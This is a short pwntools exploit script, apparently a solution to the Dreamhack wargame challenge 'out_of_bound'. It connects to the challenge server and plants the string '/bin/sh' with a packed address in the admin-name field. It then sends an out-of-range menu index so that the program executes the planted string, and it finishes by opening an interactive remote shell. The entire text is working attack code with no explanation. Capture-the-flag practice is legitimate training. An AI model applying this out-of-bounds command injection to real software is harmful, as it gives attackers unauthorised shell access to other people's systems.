# https://dreamhack.io/wargame/challenges/11

from pwn import *
context.log_level = 'DEBUG'
p = remote("host3.dreamhack.games", 10817)
#p = process("./out_of_bound")

p.recvuntil('Admin name: ')
p.sendline(b'/bin/sh\x00' + p32(0x804a0ac))

p.recvuntil('What do you want?: ')
p.sendline('21')
#p.recvall()
p.interactive()